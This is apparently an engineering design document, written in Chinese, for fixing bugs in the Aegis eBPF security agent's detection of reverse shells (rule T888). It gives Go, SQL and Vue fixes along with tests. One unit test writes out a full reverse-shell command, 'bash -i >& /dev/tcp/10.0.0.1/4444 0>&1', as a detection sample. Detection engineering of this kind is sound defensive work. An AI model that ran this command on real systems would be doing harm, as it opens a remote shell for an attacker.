# Agent eBPF 检测 Bug 修复设计文档

## 1. 问题描述

在 Aegis v5.7 运行时威胁检测流程中，发现以下两个关键问题：

1. **T888 规则 MITRE ID 显示异常**：Sigma 规则 `T888`（"反弹 Shell 命令行检测"）在规则列表中 MITRE ID 显示不一致，导致服务端 `block_policy_repo.go` 精确匹配失败，自动封锁策略无法生效。
2. **进程 1527558 未被检测到**：节点上明确存在的进程未触发 Sigma 规则匹配，说明 eBPF 事件采集链路存在数据丢失或字段映射错误。

## 2. Root Cause 分析

### Bug 1: extractMitreID 大小写处理缺陷 [P0]

- **文件**: `agent/internal/sigma/matcher.go:307-314`
- **问题**: `extractMitreID` 函数使用 `strings.TrimPrefix(tag, "attack.t")` 去除前缀，该操作区分大小写。当 Sigma 规则标签为 `attack.t888`（小写 t）时，`TrimPrefix` 无法匹配 `attack.t` 前缀（因为函数写的是 `attack.T`），返回 `t888` 而非标准格式 `T888`。
- **影响**: 服务端 `block_policy_repo.go:76` 使用 `WHERE mitre_id = 'T888'` 精确匹配，`t888` 无法命中，导致自动封锁策略失效。

```go
// 缺陷代码
func extractMitreID(tags []string) string {
    for _, tag := range tags {
        if strings.HasPrefix(tag, "attack.t") || strings.HasPrefix(tag, "attack.T") {
            return strings.TrimPrefix(tag, "attack.t")  // 小写标签返回 t888
        }
    }
    return ""
}
```

### Bug 2: eBPF 事件通道溢出静默丢弃 [P1]

- **文件**: `agent/internal/ebpf/loader.go:235-242`
- **问题**: eBPF 事件读取使用非阻塞 `select/default` 模式，当事件通道满时直接进入 `default` 分支丢弃事件，无任何日志或指标输出。
- **影响**: 高负载场景下（大量进程创建），事件被静默丢弃，无法排查检测遗漏问题。

```go
// 缺陷代码
select {
case eventChan <- event:
    // 正常发送
default:
    // 静默丢弃，无日志
}
```

### Bug 3: 命令行参数截断 [P2]

- **文件**: `agent/internal/ebpf/events.go:10`, `execve.bpf.c:9`
- **问题**: eBPF 内核态定义 `Args` 字段为 `[256]byte`，`execve.bpf.c` 中 `bpf_probe_read_user_str` 限制读取 256 字节。长命令行（如反弹 Shell 的 `bash -i >& /dev/tcp/...`）被截断。
- **影响**: 截断后的命令行可能无法匹配 Sigma 规则中的关键词。此问题被 Bug 4 的修复方案缓解。

### Bug 4: /proc 回退逻辑不完善 [P1]

- **文件**: `agent/internal/ebpf/loader.go:177-193`
- **问题**: `/proc` 回退逻辑仅在 eBPF 数据**完全为空**时触发（`len(event.Args) == 0`）。当 eBPF 返回截断数据（如 256 字节）时，回退逻辑不触发，导致使用不完整的截断数据。
- **影响**: Bug 3 的截断问题无法通过回退机制修复。

```go
// 缺陷代码
if len(event.Args) == 0 {  // 仅检查完全为空
    cmdline := readProcCmdline(event.PID)
    event.Args = cmdline
}
```

### Bug 5: image/exe 字段映射错误 [P0]

- **文件**: `agent/internal/ebpf/pipeline.go:127-128`
- **问题**: `buildEventMap` 函数将 `image` 和 `exe` 字段设置为 `event.Args`（完整命令行），而非 `event.FilePath`（可执行文件路径）。
- **影响**: Sigma 规则中 `Image|endswith: '/bash'` 等条件无法匹配，因为 `image` 字段值为 `bash -i >& /dev/tcp/...` 而非 `/usr/bin/bash`。

```go
// 缺陷代码
eventMap["image"] = event.Args    // 错误：应为 event.FilePath
eventMap["exe"] = event.Args      // 错误：应为 event.FilePath
```

### Bug 6: /proc 回退遗漏已运行进程 [P1]

- **文件**: `agent/internal/ebpf/collector.go:126-183`
- **问题**: `monitorProc` 函数启动时 `knownPIDs` 为空 map，仅跟踪 Agent 启动后新创建的进程。Agent 启动前已运行的进程（如已建立的反弹 Shell）永远不会被 `/proc` 扫描发现。
- **影响**: Agent 重启或首次部署后，已存在的恶意进程无法被检测。

### Bug 7: process_exec cmdline 误报为 -bash [P0]（2026-05-15）

- **文件**: `agent/bpf/execve.bpf.c`, `agent/internal/ebpf/loader.go`, `agent/internal/ebpf/events.go`
- **现象**: 反弹 Shell 等 `process_exec` 事件的 `cmdline` 被误报为旧进程命令行（例如 `-bash`），而不是本次 `execve` 的真实参数。
- **根因 1**: `sys_enter_execve` 发生在进程映像替换之前，此时从 `/proc/{pid}/cmdline` 读取到的是旧进程的 cmdline。将 `/proc` 作为 execve entry 阶段的优先来源会把旧命令行覆盖到新 exec 事件上。
- **根因 2**: 当前 `execve.bpf.c` 只读取 `argv[1]`，缺少 `argv[0]` 以及后续参数，无法在 Go 侧重建完整命令行；同时 `task comm` 只适合作为短进程名，不应作为 `arguments/cmdline` 的事实来源。
- **影响**: `commandline` 字段可能被旧 shell 名称污染，`Image|endswith`、`CommandLine|contains` 等 Sigma 条件出现误报或漏报；`FilePath`、`ProcessName`、`Args` 之间的语义边界不清晰。

### Bug 8: T888 告警不显示规则名称和 MITRE 信息 [P0]（2026-05-15）

- **文件**: `proto/agent_comm.proto`, `agent/internal/ebpf/pipeline.go`, `server/internal/grpc_server/server.go`, `api-server/internal/repository/alert_repo.go`, `frontend/src/views/detection/AIAnalysis.vue`
- **现象**: AI 分析页面告警列表中，T888（反弹 Shell 检测）告警的规则名称和 MITRE 信息显示为空。
- **根因 1**: Agent 的 `buildRuntimeEvent()` 不发送 `rule_title`，因为 proto 消息 `RuntimeEvent` 没有该字段。`CompiledRule.Title` 虽然可用但未被传递。
- **根因 2**: Server 的 `createAlertFromEvent()` 未设置 `RuleTitle`，且 T888 不在 `GetMITREChineseDescription` 映射中，导致 `mitre_name` 也为空。
- **根因 3**: 告警查询 JOIN 条件 `LOWER(sr.mitre_id) = LOWER(alerts.mitre_id)` 使用 `mitre_id` 而非 `rule_id` 关联 `sigma_rules` 表，无法正确解析规则标题。
- **根因 4**: 前端 `AIAnalysis.vue` 没有 MITRE 列，且 `rule_title` 列没有 fallback 逻辑。
- **影响**: 所有通过 Agent 侧 Sigma 匹配生成的告警，如果 `rule_title` 未被直接存储，则在告警列表中无法显示规则名称和 MITRE 信息。

### Bug 9: T888 告警 MITRE 值仍为空 [P0]（2026-05-15）

- **文件**: `server/internal/grpc_server/server.go`
- **现象**: Bug 8 修复后，`rule_title` 已正确显示，但 `mitre_id` 仍为空。
- **根因**: Sigma 规则 YAML content 中 `tags: [T888]` 缺少 `attack.` 前缀，而 Agent 的 `extractMitreID()` 期望 `attack.t*` 格式，返回空字符串。Server 的 `createAlertFromEvent()` 在 line 542-549 已经查到了 rule 对象，但在 disabled 检查后丢弃了，没有用 `rule.MitreID` 作为 fallback。
- **数据库证据**: `sigma_rules` 表 `mitre_id='T888'`（正确），`content` YAML `tags: [T888]`（缺少前缀）；`alerts` 表 `mitre_id=''`（空）。
- **影响**: 所有 tags 格式不符合 `attack.t*` 规范的 Sigma 规则，其告警的 MITRE 信息将丢失。

## 3. 修复方案

### Fix 1: extractMitreID 标准化

将标签统一转为小写后再匹配，输出结果统一为大写 `T` 前缀格式。

```go
func extractMitreID(tags []string) string {
    for _, tag := range tags {
        lower := strings.ToLower(tag)
        if strings.HasPrefix(lower, "attack.t") {
            id := strings.TrimPrefix(lower, "attack.")
            return strings.ToUpper(id)
        }
    }
    return ""
}
```

**计划验证**: 单元测试 `TestExtractMitreID` 覆盖大小写、子技术（如 `T1059.004`）、空标签等场景。

### Fix 2: 事件丢弃计数器

添加原子计数器统计丢弃事件数量，每 1000 次丢弃输出一条聚合日志，避免日志风暴。

```go
var dropCount atomic.Int64

select {
case eventChan <- event:
    // 正常发送
default:
    if dropCount.Add(1)%1000 == 0 {
        log.Warnf("eBPF event channel full, dropped %d events total", dropCount.Load())
    }
}
```

**计划验证**: 通过日志观察丢弃计数，评估通道容量是否需要调整。

### Fix 3: 命令行参数缓冲区设计更新（2026-05-15）

eBPF 内核态保持 bounded buffer 设计，但采集对象从单个 `argv[1]` 改为 `argv[0..N]`。每个参数以 `NUL` 分隔写入固定长度 args buffer，Go 侧解码时还原为空格分隔的 `CommandLine`。

设计约束：

- `MAX_ARGC` 与 `MAX_ARGS_SIZE` 必须是编译期常量，eBPF 使用 bounded loop，保证 verifier 可验证。
- eBPF 侧读取 `filename` 和 `argv[0..N]`，args buffer 使用 `NUL-separated` 编码，避免用户态再猜测参数边界。
- 参数超出上限时设置截断标记或保留可观测日志字段，Go 侧不得回退到 `/proc/{pid}/cmdline` 覆盖已采集到的 eBPF argv。

### Fix 4: execve argv 优先与 /proc 兜底策略（2026-05-15）

改变策略：`process_exec` 的命令行以 eBPF 在 syscall entry 采集到的 `filename` 和 `argv` 为准。`/proc` 不再作为优先来源，仅在 eBPF `filename` 与 `argv` 都缺失时兜底，避免在 `sys_enter_execve` 时读到旧进程 cmdline。

字段语义：

- `FilePath`: 优先使用 execve `filename`；缺失时使用 `/proc/{pid}/exe`；仍缺失时留空。
- `ProcessName`: 优先从 `filename` basename 推导，其次从 `argv[0]` basename 推导，最后才使用 `comm`。
- `CommandLine`/`Args`: 优先解码 eBPF `NUL-separated argv`；只有 eBPF `filename` 与 `argv` 均为空时，才读取 `/proc/{pid}/cmdline` 作为兜底。
- `image`/`exe`: 映射为 `FilePath`，不再映射为完整命令行。

```go
func (l *Loader) processExecEvent(data []byte) {
    // ... 解析 eBPF 数据 ...

    filename := cstrToString(e.Filename[:])
    argv := decodeNullSeparatedArgs(e.Args[:])
    cmdLine := strings.Join(argv, " ")

    if filename == "" {
        if exePath, err := os.Readlink(fmt.Sprintf("/proc/%d/exe", e.Pid)); err == nil {
            filename = exePath
        }
    }

    if filename == "" && len(argv) == 0 {
        cmdLine = readProcCmdlineFallback(e.Pid)
    }

    processName := deriveProcessName(filename, argv, cstrToString(e.Comm[:]))
}
```

**设计参考**: 参考 Cilium/Tetragon 的 `process_exec` 模型，将 binary/path 与 arguments/cmdline 分离：binary/path 表示执行文件，arguments/cmdline 表示 argv 参数序列；eBPF 侧采集 argv，而不是用 `task comm` 或 entry 阶段 `/proc/cmdline` 代替命令行。

**计划验证**:

- 待执行 `execve("/usr/bin/bash", ["bash", "-c", "..."])` 场景，验证 `CommandLine` 来自 eBPF argv 而不是旧 `/proc/{pid}/cmdline`。
- 待执行交互登录 shell 中触发新 exec，验证不会将旧进程 cmdline 误报为 `-bash`。
- 待执行 eBPF argv 缺失场景，验证仅在 `filename` 与 `argv` 都为空时才读取 `/proc` 兜底。

### Fix 5: image/exe 字段修正

将 `image` 和 `exe` 字段映射为可执行文件路径，`commandline` 保留完整命令行。当 `FilePath` 为空时，从命令行第一个 token 提取。

```go
// 提取可执行文件路径
exePath := event.FilePath
if exePath == "" && cmdLine != "" {
    parts := strings.Fields(cmdLine)
    if len(parts) > 0 {
        exePath = parts[0]
    }
}

eventMap := map[string]any{
    "image":       exePath,   // 可执行路径: /usr/bin/bash
    "exe":         exePath,   // 可执行路径: /usr/bin/bash
    "commandline": cmdLine,   // 完整命令行: bash -i >& /dev/tcp/...
}
```

**计划验证**: 单元测试 `TestBuildEventMapImageExeFields` 和 `TestBuildEventMapExeFromCommandLine` 覆盖正常路径和 `FilePath` 为空两种场景。

### Fix 6: /proc 启动快照

Agent 启动时遍历 `/proc` 目录，对所有已运行进程生成事件并通过通道发送，触发 Sigma 匹配。

```go
func (c *Collector) snapshotExistingProcesses(knownPIDs map[int]struct{}) {
    entries, err := os.ReadDir("/proc")
    if err != nil {
        return
    }

    count := 0
    for _, entry := range entries {
        pid, err := parsePID(entry.Name())
        if err != nil {
            continue
        }
        knownPIDs[pid] = struct{}{}

        comm, _ := os.ReadFile(fmt.Sprintf("/proc/%d/comm", pid))
        cmdline, _ := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
        cmdlineStr := string(bytes.ReplaceAll(cmdline, []byte{0}, []byte(" ")))
        cmdlineStr = strings.TrimSpace(cmdlineStr)

        if cmdlineStr == "" {
            continue // 跳过内核线程
        }

        event := Event{
            EventID:     generateEventID(),
            HostID:      c.hostID,
            Hostname:    c.hostname,
            Timestamp:   time.Now().UnixMilli(),
            EventType:   "process_exec",
            PID:         pid,
            ProcessName: strings.TrimSpace(string(comm)),
            CommandLine: cmdlineStr,
        }

        select {
        case c.events <- event:
            count++
        default:
        }
    }
}
```

**计划验证**: 单元测试 `TestSnapshotExistingProcesses` 和 `TestSnapshotExistingProcessesPopulatesKnownPIDs` 验证当前进程被捕获。

### Fix 7: T888 告警规则名称和 MITRE 显示修复（2026-05-15）

**修复策略**: 从 Agent 到前端全链路修复，确保告警的 `rule_title` 和 `mitre_id` 正确传递和显示。

**7.1 Proto 新增字段**

`proto/agent_comm.proto` - `RuntimeEvent` 消息新增 `matched_rule_title` 字段:

```protobuf
message RuntimeEvent {
  // ... existing fields ...
  string process_tree = 16;
  string matched_rule_title = 17;  // 新增：规则标题
}
```

**7.2 Agent 发送规则标题**

`agent/internal/ebpf/pipeline.go` - `buildRuntimeEvent()` 新增:

```go
return &pb.RuntimeEvent{
    // ... existing fields ...
    MatchedRuleTitle: match.Title,  // 新增
}
```

**7.3 Server 设置 RuleTitle**

`server/internal/grpc_server/server.go` - `createAlertFromEvent()` 新增:

```go
alert := &model.Alert{
    // ... existing fields ...
    RuleTitle: event.MatchedRuleTitle,  // 新增
}
```

**7.4 新增 T888 MITRE 映射**

`server/internal/model/mitre_mapping.go` 和 `api-server/internal/model/mitre_mapping.go` 新增:

```go
"T888": {
    Name:        "反弹Shell命令行检测",
    Description: "检测反弹Shell命令行操作",
},
```

**7.5 修复告警查询 JOIN**

`api-server/internal/repository/alert_repo.go` - 所有 4 处 JOIN 条件修改:

```sql
-- 修改前
LEFT JOIN sigma_rules sr ON LOWER(sr.mitre_id) = LOWER(alerts.mitre_id)
-- 修改后
LEFT JOIN sigma_rules sr ON sr.rule_id = alerts.rule_id
```

`api-server/internal/repository/alert_repo_findbyids.go` - 子查询修改:

```sql
-- 修改前
(SELECT title FROM sigma_rules WHERE LOWER(mitre_id) = LOWER(alerts.mitre_id) LIMIT 1)
-- 修改后
(SELECT title FROM sigma_rules WHERE rule_id = alerts.rule_id LIMIT 1)
```

**7.6 前端显示修复**

`frontend/src/views/detection/AIAnalysis.vue` - 告警表格修改:

```html
<!-- 规则名称列增加 fallback -->
<el-table-column prop="rule_title" label="规则" min-width="150">
  <template #default="{ row }">
    {{ row.rule_title || row.mitre_id || '-' }}
  </template>
</el-table-column>

<!-- 新增 MITRE 列 -->
<el-table-column label="MITRE" width="120">
  <template #default="{ row }">
    {{ row.mitre_id || '-' }}
  </template>
</el-table-column>
```

**计划验证**: curl 测试 `GET /api/v1/detection/alerts` 验证返回数据包含 `rule_title` 和 `mitre_id`；前端 AIAnalysis.vue 验证规则名称和 MITRE 列正确显示。

### Fix 8: Server 侧 MITRE ID 和 RuleTitle 兜底逻辑（2026-05-15）

**问题**: Agent 侧 Sigma 规则 YAML 的 `tags` 格式不符合 `attack.t*` 规范时，`extractMitreID()` 返回空字符串，导致告警的 `mitre_id` 为空。

**修复策略**: 在 `createAlertFromEvent()` 中保留已查询的 `rule` 对象，用 `sigma_rules` 表的 `mitre_id` 和 `title` 作为 fallback。

`server/internal/grpc_server/server.go` - `createAlertFromEvent()` 修改:

```go
// 修改前 (line 542-549): 查到 rule 后丢弃
if s.sigmaRuleRepo != nil && event.MatchedRuleId != "" {
    rule, err := s.sigmaRuleRepo.FindByRuleID(event.MatchedRuleId)
    if err == nil && rule != nil && rule.Status == "disabled" {
        return
    }
}

// 修改后: 保留 rule 引用用于 fallback
var matchedRule *model.SigmaRule
if s.sigmaRuleRepo != nil && event.MatchedRuleId != "" {
    rule, err := s.sigmaRuleRepo.FindByRuleID(event.MatchedRuleId)
    if err == nil && rule != nil {
        if rule.Status == "disabled" {
            return
        }
        matchedRule = rule
    }
}

// 构建告警时增加 fallback 逻辑
mitreID := strings.ToUpper(event.MitreId)
ruleTitle := event.MatchedRuleTitle
if matchedRule != nil {
    if mitreID == "" && matchedRule.MitreID != "" {
        mitreID = strings.ToUpper(matchedRule.MitreID)
    }
    if ruleTitle == "" && matchedRule.Title != "" {
        ruleTitle = matchedRule.Title
    }
}
```

**计划验证**: curl 测试 `GET /api/v1/detection/alerts` 验证新告警的 `mitre_id` 字段正确填充为 `T888`。

## 4. 测试用例

### 4.1 extractMitreID 单元测试

```go
func TestExtractMitreID(t *testing.T) {
    tests := []struct {
        name     string
        tags     []string
        expected string
    }{
        {"大写 T888", []string{"attack.tactic", "attack.T888"}, "T888"},
        {"小写 t888", []string{"attack.tactic", "attack.t888"}, "T888"},
        {"混合大小写", []string{"attack.tactic", "attack.T888"}, "T888"},
        {"子技术 T1059.004", []string{"attack.t1059.004"}, "T1059.004"},
        {"无匹配标签", []string{"attack.tactic", "car.2013-01-001"}, ""},
        {"空标签列表", []string{}, ""},
        {"仅 tactic 标签", []string{"attack.tactic"}, ""},
        {"多个 MITRE ID", []string{"attack.t888", "attack.t1059"}, "T888"},
    }
    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            result := extractMitreID(tt.tags)
            assert.Equal(t, tt.expected, result)
        })
    }
}
```

### 4.2 buildEventMap 集成测试

```go
func TestBuildEventMapImageExeFields(t *testing.T) {
    // 正常场景
    event := &events.SecurityEvent{
        PID:      1234,
        FilePath: "/usr/bin/bash",
        Args:     "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    }
    m := buildEventMap(event)
    assert.Equal(t, "/usr/bin/bash", m["image"])
    assert.Equal(t, "/usr/bin/bash", m["exe"])
    assert.Contains(t, m["commandline"], "bash -i")

    // FilePath 为空场景
    event2 := &events.SecurityEvent{
        PID:      5678,
        FilePath: "",
        Args:     "suspicious_command",
    }
    m2 := buildEventMap(event2)
    assert.Equal(t, "", m2["image"])
    assert.Equal(t, "suspicious_command", m2["commandline"])
}
```

### 4.3 进程快照测试

```go
func TestSnapshotExistingProcesses(t *testing.T) {
    c := &Collector{
        knownPIDs: make(map[uint32]bool),
    }
    err := c.snapshotExistingProcesses()
    assert.NoError(t, err)

    // 验证当前测试进程被捕获
    currentPID := uint32(os.Getpid())
    assert.True(t, c.knownPIDs[currentPID])
}
```

## 5. 实施计划

### 5.1 设计涉及文件清单

| 文件 | 修改内容 |
|------|----------|
| `agent/internal/sigma/matcher.go` | 修复 `extractMitreID` 函数 |
| `agent/internal/sigma/matcher_test.go` | 新增 `TestExtractMitreID` 和 `TestCompileRuleMitreIDNormalization` |
| `agent/internal/ebpf/pipeline.go` | 修复 `buildEventMap` 中 image/exe 字段映射 |
| `agent/internal/ebpf/pipeline_test.go` | 新增 `TestBuildEventMapImageExeFields` 和 `TestBuildEventMapExeFromCommandLine`，修复现有测试 mitre_id 期望值 |
| `agent/internal/ebpf/bpf/execve.bpf.c` | 设计改为 bounded loop 读取 `argv[0..N]` 到 `NUL-separated` args buffer，并在 buffer/argc 达到上限时设置截断标记 |
| `agent/internal/ebpf/events.go` | 扩展 exec 事件结构，表达 512 字节 argv buffer 与 `ExecEventArgsTruncated` 截断标记 |
| `agent/internal/ebpf/loader.go` | 重写 `processExecEvent`（eBPF argv 优先，/proc 仅兜底）；`execve` 加载失败作为必需程序错误返回，触发 Collector fallback |
| `agent/internal/ebpf/collector.go` | 新增 `snapshotExistingProcesses`，修复 `monitorProc` cmdline 处理 |
| `agent/Makefile` | 增加架构 include 目录，确保当前环境下 `make bpf` 可找到 `asm/types.h` |

### 5.2 计划验证 / 待执行验证

- 待执行 `agent/internal/sigma` MITRE ID 标准化单元测试。
- 待执行 `agent/internal/ebpf` event map 字段映射单元测试。
- 待执行 execve argv 解码单元测试，覆盖 `argv[0]`、多参数、空参数、截断参数。
- 待执行真实 `execve` 集成验证，确认 `CommandLine` 不被旧 `/proc/{pid}/cmdline` 覆盖。
- 待执行 T888 反弹 Shell 检测验证，确认 `image/exe` 使用执行文件路径，`commandline` 使用 argv 重建结果。

### 5.3 2026-05-15 已执行验证

| 验证命令 | 结果 | 说明 |
|:---|:---|:---|
| `env GOCACHE=/tmp/aegis-go-cache go test ./internal/ebpf -count=1` | 通过 | 覆盖 argv NUL-separated 解码、`-bash` 旧 `/proc` cmdline 不覆盖 eBPF argv、eBPF 缺失时 `/proc` 兜底、截断标记透传、必需 execve 加载失败返回错误 |
| `make bpf` | 通过 | 重新生成 eBPF 对象；当前环境需 `Makefile` 增加架构 include 目录以找到 `asm/types.h` |
| `env GOCACHE=/tmp/aegis-go-cache make build` | 通过 | 生成 linux/amd64 与 linux/arm64 agent 二进制 |

未执行项：

- 未执行本机 agent root/eBPF 加载运行验证；该验证需要目标机器具备 eBPF 权限并替换 `/opt/aegis-agent` 运行中的 agent。
- 未执行 `curl` 接口验证；本次修改不涉及 HTTP API 接口。

### 5.4 部署

```bash
cd agent && make build
# 部署到 /opt/aegis-agent/aegis-agent.new
# 停止服务后替换: sudo mv aegis-agent.new aegis-agent
# 重启服务: sudo systemctl start aegis-agent
```

### 5.5 API 计划验证

```bash
# 查询 T888 规则
curl -s "http://localhost:8082/api/v1/detection/rules?query=T888" \
  -H "Authorization: Bearer $TOKEN"
# 计划检查: mitre_id 为 "T888"，status 为 "active"，title 为 "反弹Shell检测"
```

## 6. 已知限制

| 限制项 | 说明 | 缓解方案 |
|--------|------|----------|
| eBPF Args 缓冲区上限 | 内核态固定缓冲区仍可能截断超长 argv | 使用 bounded loop 读取 `argv[0..N]`，记录截断状态；按 verifier 约束评估 `MAX_ARGS_SIZE` |
| /proc cmdline 时序竞态 | `sys_enter_execve` 时读取 `/proc/{pid}/cmdline` 会得到旧进程 cmdline | `process_exec` 优先使用 eBPF argv；`/proc` 仅在 eBPF filename/argv 都缺失时兜底 |
| 进程快照竞态 | 快照期间新创建的进程可能被遗漏 | 由 eBPF 实时监控补充 |
| /proc 不可用场景 | 容器环境或权限不足时 /proc 可能受限 | 优先使用 eBPF filename/argv，避免依赖 /proc |
